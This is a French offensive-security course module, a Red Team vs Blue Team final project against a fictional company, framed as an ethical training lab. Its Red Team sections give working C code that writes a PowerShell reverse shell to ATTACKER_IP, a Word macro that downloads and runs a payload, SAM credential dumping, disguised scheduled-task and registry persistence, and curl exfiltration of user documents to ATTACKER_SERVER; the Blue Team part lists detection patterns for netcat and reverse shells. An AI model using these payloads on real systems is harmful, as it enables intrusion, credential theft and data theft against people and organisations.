# Module 61 : Projet Final - Red Team vs Blue Team

## 🎯 Objectif du Projet Final

Dans ce projet final, tu vas :
- Mettre en pratique TOUS les modules du cours
- Simuler un engagement Red Team complet
- Implémenter des défenses Blue Team
- Créer un rapport professionnel
- Démontrer ta maîtrise du C offensive

## 📚 Scénario

### Contexte

Tu es engagé par **TechCorp Inc.** pour tester leur sécurité. L'entreprise a :
- Un réseau d'entreprise (192.168.1.0/24)
- Plusieurs serveurs (web, database, file server)
- Des endpoints utilisateurs
- Une infrastructure cloud (AWS)
- Une équipe Blue Team (SOC)

### Objectifs Red Team

1. **Initial Access** : Obtenir un premier accès au réseau
2. **Persistence** : Installer des backdoors
3. **Privilege Escalation** : Obtenir les droits administrateur
4. **Lateral Movement** : Compromettre d'autres machines
5. **Data Exfiltration** : Exfiltrer des données sensibles
6. **Domain Domination** : Compromettre le contrôleur de domaine

### Objectifs Blue Team

1. **Detection** : Détecter les activités malveillantes
2. **Response** : Réagir aux incidents
3. **Containment** : Isoler les systèmes compromis
4. **Eradication** : Supprimer les menaces
5. **Recovery** : Restaurer les opérations

## 🔍 Architecture du Lab

```
┌─────────────────────────────────────────────────────┐
│              TECHCORP NETWORK                       │
├─────────────────────────────────────────────────────┤
│                                                     │
│  DMZ (192.168.1.0/24)                               │
│  ┌────────────────────────────────────┐            │
│  │ Web Server (192.168.1.10)          │            │
│  │ - Apache/PHP                       │            │
│  │ - WordPress                        │            │
│  │ - Vulnerable plugin                │            │
│  └────────────────────────────────────┘            │
│                                                     │
│  Internal Network (10.0.0.0/24)                     │
│  ┌────────────────────────────────────┐            │
│  │ Domain Controller (10.0.0.5)       │            │
│  │ - Active Directory                 │            │
│  │ - DNS                              │            │
│  └────────────────────────────────────┘            │
│                                                     │
│  ┌────────────────────────────────────┐            │
│  │ File Server (10.0.0.10)            │            │
│  │ - SMB shares                       │            │
│  │ - Sensitive documents              │            │
│  └────────────────────────────────────┘            │
│                                                     │
│  ┌────────────────────────────────────┐            │
│  │ User Workstation (10.0.0.20)       │            │
│  │ - Windows 10                       │            │
│  │ - Email client                     │            │
│  └────────────────────────────────────┘            │
│                                                     │
│  ┌────────────────────────────────────┐            │
│  │ Database Server (10.0.0.15)        │            │
│  │ - MySQL                            │            │
│  │ - Customer data                    │            │
│  └────────────────────────────────────┘            │
│                                                     │
│  Security Infrastructure                            │
│  ┌────────────────────────────────────┐            │
│  │ SIEM (10.0.0.100)                  │            │
│  │ - Splunk                           │            │
│  │ - Log aggregation                  │            │
│  └────────────────────────────────────┘            │
│                                                     │
│  ┌────────────────────────────────────┐            │
│  │ Firewall (10.0.0.1)                │            │
│  │ - IDS/IPS                          │            │
│  │ - Traffic filtering                │            │
│  └────────────────────────────────────┘            │
│                                                     │
└─────────────────────────────────────────────────────┘
```

## 💻 Implémentation Red Team

### Phase 1 : Reconnaissance

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void phase1_reconnaissance() {
    printf("=== PHASE 1: RECONNAISSANCE ===\n\n");

    // 1. OSINT
    printf("[*] Step 1: OSINT\n");
    printf("  - Google dorking: site:techcorp.com\n");
    printf("  - LinkedIn: Enumerate employees\n");
    printf("  - Shodan: Search for exposed services\n");
    printf("  - theharvester: Email harvesting\n");

    // 2. Network Scanning
    printf("\n[*] Step 2: Network Scanning\n");
    printf("  Command: nmap -sS -sV -p- 192.168.1.0/24\n");
    system("nmap -sS -sV -p- 192.168.1.0/24 -oN phase1_scan.txt 2>/dev/null || echo '[!] Run: nmap -sS -sV -p- 192.168.1.0/24'");

    // 3. Vulnerability Scanning
    printf("\n[*] Step 3: Vulnerability Scanning\n");
    printf("  Command: nikto -h http://192.168.1.10\n");
    printf("  Command: wpscan --url http://192.168.1.10\n");

    // 4. Subdomain Enumeration
    printf("\n[*] Step 4: Subdomain Enumeration\n");
    printf("  Command: amass enum -d techcorp.com\n");

    printf("\n[+] Reconnaissance complete. Results saved to phase1_scan.txt\n");
}

int main() {
    printf("=== RED TEAM OPERATION: TECHCORP ===\n\n");

    phase1_reconnaissance();

    printf("\n[!] Next: Phase 2 - Weaponization\n");

    return 0;
}
```

### Phase 2 : Weaponization & Initial Access

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void create_phishing_payload() {
    printf("[*] Creating phishing payload...\n");

    // Payload: Reverse shell PowerShell
    FILE *fp = fopen("payload.ps1", "w");

    if (!fp) {
        perror("fopen");
        return;
    }

    fprintf(fp, "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);\n");
    fprintf(fp, "$stream = $client.GetStream();\n");
    fprintf(fp, "[byte[]]$bytes = 0..65535|%%{0};\n");
    fprintf(fp, "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){\n");
    fprintf(fp, "    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);\n");
    fprintf(fp, "    $sendback = (iex $data 2>&1 | Out-String );\n");
    fprintf(fp, "    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';\n");
    fprintf(fp, "    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n");
    fprintf(fp, "    $stream.Write($sendbyte,0,$sendbyte.Length);\n");
    fprintf(fp, "    $stream.Flush()\n");
    fprintf(fp, "};\n");
    fprintf(fp, "$client.Close()\n");

    fclose(fp);

    printf("[+] payload.ps1 created\n");
}

void create_macro_document() {
    printf("[*] Creating malicious Word document...\n");

    FILE *fp = fopen("invoice.vba", "w");

    if (!fp) {
        perror("fopen");
        return;
    }

    fprintf(fp, "Sub AutoOpen()\n");
    fprintf(fp, "    ExecutePayload\n");
    fprintf(fp, "End Sub\n\n");

    fprintf(fp, "Sub Document_Open()\n");
    fprintf(fp, "    ExecutePayload\n");
    fprintf(fp, "End Sub\n\n");

    fprintf(fp, "Sub ExecutePayload()\n");
    fprintf(fp, "    Dim cmd As String\n");
    fprintf(fp, "    cmd = \"powershell -nop -w hidden -c \"\n");
    fprintf(fp, "    cmd = cmd & \"IEX(New-Object Net.WebClient)\"\n");
    fprintf(fp, "    cmd = cmd & \".DownloadString('http://ATTACKER_IP/payload.ps1')\"\n");
    fprintf(fp, "    Shell cmd, vbHide\n");
    fprintf(fp, "End Sub\n");

    fclose(fp);

    printf("[+] invoice.vba created\n");
    printf("[*] Paste this macro into a Word document and save as .docm\n");
}

void phase2_weaponization() {
    printf("=== PHASE 2: WEAPONIZATION ===\n\n");

    create_phishing_payload();
    create_macro_document();

    printf("\n[+] Weaponization complete\n");
    printf("[*] Setup C2 listener: nc -lvnp 4444\n");
    printf("[*] Host payload: python3 -m http.server 80\n");
    printf("[*] Send phishing email with invoice.docm\n");
}

int main() {
    phase2_weaponization();
    return 0;
}
```

### Phase 3 : Post-Exploitation Framework

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void enumerate_system() {
    printf("=== System Enumeration ===\n");

    system("whoami");
    system("hostname");
    system("ifconfig || ipconfig");
    system("ps aux || tasklist");
    system("netstat -an");
}

void dump_credentials() {
    printf("=== Credential Dumping ===\n");

    printf("[*] Dumping SAM database...\n");
    system("reg save HKLM\\SAM sam.hive 2>/dev/null");
    system("reg save HKLM\\SYSTEM system.hive 2>/dev/null");

    printf("[*] Searching for credentials in files...\n");
    system("findstr /si password *.txt *.xml *.ini 2>/dev/null | head -20");
}

void lateral_movement() {
    printf("=== Lateral Movement ===\n");

    printf("[*] Scanning internal network...\n");
    system("for /L %%i in (1,1,254) do @ping -n 1 10.0.0.%%i | find \"Reply\" 2>/dev/null");

    printf("[*] Enumerating SMB shares...\n");
    system("net view /all");
}

void establish_persistence() {
    printf("=== Establishing Persistence ===\n");

    printf("[*] Creating scheduled task...\n");
    system("schtasks /create /tn \"WindowsUpdate\" /tr \"C:\\\\Windows\\\\Temp\\\\backdoor.exe\" /sc onlogon /ru SYSTEM");

    printf("[*] Adding registry key...\n");
    system("reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v Update /t REG_SZ /d \"C:\\\\Windows\\\\Temp\\\\backdoor.exe\"");
}

void exfiltrate_data() {
    printf("=== Data Exfiltration ===\n");

    printf("[*] Compressing sensitive files...\n");
    system("tar czf /tmp/exfil.tar.gz ~/Documents ~/Desktop 2>/dev/null");

    printf("[*] Exfiltrating via HTTPS...\n");
    system("curl -X POST -F 'file=@/tmp/exfil.tar.gz' https://ATTACKER_SERVER/upload");

    printf("[*] Cleaning up...\n");
    system("rm -f /tmp/exfil.tar.gz");
}

void phase3_post_exploitation() {
    printf("=== PHASE 3: POST-EXPLOITATION ===\n\n");

    enumerate_system();
    dump_credentials();
    lateral_movement();
    establish_persistence();
    exfiltrate_data();

    printf("\n[+] Post-exploitation complete\n");
}

int main() {
    phase3_post_exploitation();
    return 0;
}
```

## 🛡️ Implémentation Blue Team

### Détection et Monitoring

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

void monitor_failed_logins() {
    printf("[*] Monitoring failed login attempts...\n");

    FILE *fp = fopen("/var/log/auth.log", "r");
    if (!fp) {
        perror("fopen");
        return;
    }

    char line[1024];
    int failed_count = 0;

    while (fgets(line, sizeof(line), fp)) {
        if (strstr(line, "Failed password")) {
            failed_count++;

            if (failed_count > 5) {
                printf("[!] ALERT: Possible brute force attack!\n");
                printf("    %s", line);

                // Bloquer l'IP
                char *ip = strstr(line, "from ");
                if (ip) {
                    // Extraction simplifiée
                    printf("    [ACTION] Blocking IP...\n");
                }

                break;
            }
        }
    }

    fclose(fp);
}

void detect_suspicious_processes() {
    printf("[*] Scanning for suspicious processes...\n");

    system("ps aux | grep -E '(nc|ncat|netcat|/dev/tcp|bash -i)' | grep -v grep");
}

void check_network_connections() {
    printf("[*] Checking for suspicious network connections...\n");

    // Connexions vers des ports suspects
    system("netstat -an | grep -E '(4444|8080|1337|31337)'");
}

void analyze_registry_changes() {
    printf("[*] Analyzing registry persistence...\n");

    system("reg query HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run");
}

void hunt_for_threats() {
    printf("=== THREAT HUNTING ===\n\n");

    monitor_failed_logins();
    detect_suspicious_processes();
    check_network_connections();
    analyze_registry_changes();

    printf("\n[+] Threat hunting complete\n");
}

int main() {
    printf("=== BLUE TEAM OPERATIONS ===\n\n");

    hunt_for_threats();

    return 0;
}
```

## 📊 Rapport Final

### Structure du rapport

```
=== RED TEAM ENGAGEMENT REPORT ===

1. EXECUTIVE SUMMARY
   - Objectifs
   - Méthodologie
   - Résultats clés
   - Recommandations critiques

2. SCOPE & LIMITATIONS
   - Systèmes testés
   - Exclusions
   - Timeline

3. TECHNICAL FINDINGS
   3.1 Initial Access
       - Vecteur utilisé
       - Vulnérabilité exploitée
       - Impact

   3.2 Privilege Escalation
       - Technique utilisée
       - Credentials obtenus
       - Impact

   3.3 Lateral Movement
       - Systèmes compromis
       - Chemins d'attaque
       - Impact

   3.4 Data Exfiltration
       - Données exfiltrées
       - Méthode d'exfiltration
       - Impact

4. BLUE TEAM EFFECTIVENESS
   - Alertes déclenchées
   - Temps de détection
   - Temps de réponse
   - Gaps identifiés

5. RECOMMENDATIONS
   5.1 Critical (P1)
       - Fix immediate
   5.2 High (P2)
       - Fix within 30 days
   5.3 Medium (P3)
       - Fix within 90 days
   5.4 Low (P4)
       - Fix within 6 months

6. CONCLUSION

APPENDICES
   A. Tools Used
   B. IOCs
   C. Timeline
   D. Screenshots
```

## 🎓 Certification de Complétion

```
┌─────────────────────────────────────────────────────┐
│                                                     │
│        CERTIFICATE OF COMPLETION                    │
│                                                     │
│  This certifies that                                │
│                                                     │
│              [YOUR NAME]                            │
│                                                     │
│  has successfully completed the                     │
│                                                     │
│     C FULL OFFENSIVE SECURITY COURSE                │
│                                                     │
│  Covering 61 modules from basic C to advanced       │
│  Red Team operations, including:                    │
│                                                     │
│  ✓ C Programming Fundamentals                      │
│  ✓ Memory Management & Exploitation                │
│  ✓ Network Programming                             │
│  ✓ Malware Development                             │
│  ✓ Rootkit Development                             │
│  ✓ Cloud Security                                  │
│  ✓ Red Team Operations                             │
│  ✓ Blue Team Detection                             │
│                                                     │
│  Completion Date: ________________                  │
│                                                     │
│  ────────────────────────────────────               │
│  Instructor Signature                               │
│                                                     │
└─────────────────────────────────────────────────────┘
```

## 📝 Points clés à retenir

1. **Méthodologie** : Suivre une approche structurée
2. **Documentation** : Tout documenter en temps réel
3. **Éthique** : Respecter les RoE et les limites
4. **Communication** : Rapporter les findings critiques immédiatement
5. **Professionalisme** : Rapport de qualité entreprise

### Checklist finale

```
□ Reconnaissance complétée
□ Initial access obtenu
□ Persistence établie
□ Privilege escalation réussie
□ Lateral movement effectué
□ Données sensibles identifiées
□ Exfiltration démontrée
□ Blue Team testé
□ Cleanup effectué
□ Rapport rédigé
□ Présentation préparée
```

## 🏆 Félicitations !

Tu as complété les **61 modules** du cours C Full Offensive Security !

Tu maîtrises maintenant :
- Le langage C de A à Z
- L'exploitation de vulnérabilités
- Le développement de malware
- Les techniques de Red Team
- La détection Blue Team
- L'architecture cloud
- Et bien plus !

### Prochaines étapes recommandées

1. **Pratique continue** : Labs personnels, CTFs
2. **Certifications** : OSCP, CRTO, CRTL
3. **Bug Bounty** : HackerOne, Bugcrowd
4. **Contributions** : Open source, outils Red Team
5. **Formation continue** : Nouvelles techniques

### Ressources additionnelles

- **MITRE ATT&CK** : attack.mitre.org
- **HackTheBox** : hackthebox.eu
- **TryHackMe** : tryhackme.com
- **Pentester Academy** : pentesteracademy.com
- **Offensive Security** : offensive-security.com

---

**Merci d'avoir suivi ce cours complet !**

N'oublie jamais : **Avec un grand pouvoir vient une grande responsabilité.**

Utilise ces connaissances de manière **ÉTHIQUE** et **LÉGALE** uniquement.

Good luck dans ta carrière en cybersécurité ! 🚀
